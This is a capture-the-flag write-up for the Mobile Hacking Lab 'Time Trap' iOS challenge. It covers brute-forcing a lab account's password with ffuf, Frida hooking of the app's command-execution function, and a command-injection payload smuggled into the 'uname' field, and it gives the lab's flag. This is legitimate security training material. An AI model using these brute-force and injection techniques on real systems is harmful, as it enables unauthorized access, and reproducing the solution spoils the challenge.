---
title: Time Trap - Mobile Hacking Lab
date: 2025-7-1 00:00:00 +/-TTTT
categories: [Mobile Hacking Lab]
tags: [mobile hacking lab, writeup, mobile penetration testing, ios]     # TAG names should always be lowercase
---



<br />

**Introduction**

Welcome to the **Time Trap Challenge**. In this challenge, you will explore the vulnerabilities in an internally used application named Time Trap, focusing on Command Injection. Time Trap is a fictional application that showcases insecure practices commonly found in internal applications. Your objective is to exploit the Command Injection vulnerability to gain unauthorized access and execute commands on the iOS device.

<br />

**Objective**

Exploit Command Injection vulnerability: Your task is to identify and exploit the Command Injection vulnerability within the application to execute commands on a victim's account.

<br />

There is no registration screen in the application. However, the lab hints note that employee **emp002** uses a weak password, so the next step is to brute-force **emp002**’s credentials to gain access.

<br />

Intercept the login request with Burp Suite, save the request to a file, set the `username` to `emp002`, and replace the `password` value with the placeholder `FUZZ`.

```http
POST /time-trap/login HTTP/2
Host: mhl.pages.dev
Accept: */*
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
User-Agent: Time%20Trap/1 CFNetwork/1390 Darwin/22.0.0
Content-Length: 43
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

{"username":"emp002","password":"FUZZ"}
```

<br />

Use `ffuf` with the `rockyou` wordlist to brute-force the password, and filter out responses with HTTP status `401` (returned when the username or password is incorrect, with the body `"Invalid username or password"`).

```bash
└─$ ffuf -request request.txt -request-proto https -w /usr/share/wordlists/rockyou.txt -fc 401

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : https://mhl.pages.dev/time-trap/login
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Header           : Accept: */*
 :: Header           : Content-Type: application/json
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : User-Agent: Time%20Trap/1 CFNetwork/1390 Darwin/22.0.0
 :: Header           : Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
 :: Header           : Host: mhl.pages.dev
 :: Data             : {"username":"emp002","password":"FUZZ"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 401
________________________________________________

firefly                 [Status: 200, Size: 144, Words: 1, Lines: 1, Duration: 809ms]
```

<br />

The password for **emp002** is **firefly**, so you can sign in with username **emp002** and password **firefly**.

<br />

![](/assets/img/mhl/TimeTrap/9.png)

<br />

When you press the "Check In" button, the application sends a request with the "uname" parameter in the body.

<br />

![](/assets/img/mhl/TimeTrap/10.png)

<br />

**Reverse Engineering with Ghidra**

The function `_ $s9Time_Trap20AttendanceControllerC13buttonPressedyySo8UIButtonCF` runs the command `uname -a` when the **Check In** button is pressed. It also executes a small bash script that compares the output of `$(uname)` with the `uname` parameter from the HTTP request. If they do not match, the script executes `uname -a` again.

<br />

![](/assets/img/mhl/TimeTrap/3.png)

<br />



![](/assets/img/mhl/TimeTrap/4.png)

<br />

![](/assets/img/mhl/TimeTrap/5.png)

<br />

![](/assets/img/mhl/TimeTrap/6.png)

<br />

The value of the `uname` parameter from the HTTP request is passed directly into the `_executeCommand` method.

![](/assets/img/mhl/TimeTrap/7.png)

<br />

![](/assets/img/mhl/TimeTrap/8.png)

<br />

`_executeCommand` is located in the binary at offset `0x4000`.

<br />

![](/assets/img/mhl/TimeTrap/11.png)

<br />

Observe the `_executeCommand` function (offset `0x4000`) using **Frida** to print its parameter and  see what commands are executed.

```javascript
var addr = ptr(0x4000);
var t_module = 'Time Trap';
var nw = Module.getBaseAddress(t_module);
var toAtt = nw.add(addr);

Interceptor.attach(toAtt, {
    onEnter: function (args) {
        // First parameter (x0 on arm64)
        var p0 = args[0];

        console.log("[*] onEnter: target = " + toAtt);
    

        if (p0.isNull && p0.isNull()) {
            console.log("[*] arg0 is NULL");
            return;
        }

        // Try interpreting as C-string
        try {
            var s = Memory.readUtf8String(p0);
            if (s !== null) {
                console.log("[*] arg0 as C-string: " + s);
            }
        } catch (err) {
            // not a valid C-string or unreadable
        }

    }
});
```

<br />

After running the Frida script and pressing **Check In**, the script’s console output shows `"uname -a"`, indicating that `_executeCommand` was invoked with `"uname -a"` as its parameter.

```bash
Spawned `com.mobilehackinglab.TimeTrap3.W46SY5ZJ6Z`. Resuming main thread!
[iOS Device::com.mobilehackinglab.TimeTrap3.W46SY5ZJ6Z ]-> [*] onEnter: target = 0x1009c0000
[*] arg0 as C-string: uname -a
```

<br />

Pressing **Check Out** produced console output showing the bash script
 `if [[ $(uname -a) != "" ]]; then uname -a; fi`, which indicates `_executeCommand` was invoked with that entire string as its parameter.

```bash
[iOS Device::com.mobilehackinglab.TimeTrap3.W46SY5ZJ6Z ]-> [*] onEnter: target = 0x1009c0000
[*] arg0 as C-string: if [[ $(uname -a) != "" ]]; then uname -a; fi
```

<br />

When I set the request’s `uname` field to `test`, the Frida log displayed `if [[ $(uname -a) != "test" ]]; then uname -a; fi`. This confirms that the user-supplied `uname` value is injected directly into the bash script used by `_executeCommand`.

<br />

![](/assets/img/mhl/TimeTrap/1.png)

<br />

```
[iOS Device::com.mobilehackinglab.TimeTrap3.W46SY5ZJ6Z ]-> [*] onEnter: target = 0x1041d8000
[*] arg0 as C-string: if [[ $(uname -a) != "test" ]]; then uname -a; fi
```

<br />

This script checks the output of the `uname -a` command and only prints it if it does not equal the literal string `"test"`. Here’s how it works: `$(uname -a)` runs the command and substitutes its output (the full kernel and OS information) into the condition. The `[[ ... ]]` construct is Bash’s extended test syntax, and inside it, the `!=` operator compares the substituted string with `"test"`. If the output of `uname -a` is not exactly `"test"`, the condition evaluates to true, and the `then` block executes, running `uname -a` again to display the system information. The `fi` marks the end of the conditional. In simpler terms, the script says: “If the system information is anything other than the word `test`, print the system information.” Since `uname -a` usually returns something like `Darwin iPhone XX.0.0 Darwin Kernel`, the condition will almost always be true, so the command will normally print the system details.

<br />

The `uname` parameter is inserted directly into the shell script, creating a command-injection vulnerability

```bash
if [[ $(uname -a) != "$user_input" ]]; then
    uname -a
fi
```

<br />

We need to insert our command while ensuring the Bash script continues to execute without errors. To execute the command `echo 'rce' > /tmp/rce.txt`, the Bash script should be structured as follows:

```bash
if [[ "$(uname -a)" != "any" ]]; then
    echo 'rce' > /tmp/rce.txt
fi # ]]; then  uname -a fi
```

the Bash script as a one-liner

```bash
if [[ "$(uname -a)" != "any" ]]; then echo 'rce' > /tmp/rce.txt; fi # ]]; then  uname -a fi
```

the payload is 

```bash
any" ]]; then echo 'rce' > /tmp/rce.txt; fi #
```

<br />

**The exploitation of the command-injection vulnerability**

1. Spawn the application using Frida

```
└─# frida -U -f com.mobilehackinglab.TimeTrap3.W46SY5ZJ6Z -l hook.js 
```



2. Log in with username "emp002" and password "firefly".
3. Turn Burp Proxy intercept on.
4. Press the "Check In" button.
5. Set the "uname" request parameter to `any\" ]]; then echo 'rce' > /tmp/rce.txt; fi #` and send the request.
6. Successful exploitation will cause the response to include the flag value, indicating the lab is solved.

<br />

![](/assets/img/mhl/TimeTrap/2.png)

<br />

**Note:** when you press the "Check Out" button, the Frida script will print the Bash script that was executed; observe that the injected command appears and ran as expected.

```bash
[iOS Device::com.mobilehackinglab.TimeTrap3.W46SY5ZJ6Z ]-> [*] onEnter: target = 0x1048f8000
[*] arg0 as C-string: if [[ $(uname -a) != "any" ]]; then echo 'rce' > /tmp/rce.txt; fi #" ]]; then uname -a; fi
```

<br />

**Flag:** MHL{9_t0_5_C0mm4ndz_Sl4v1ng_4w4y}
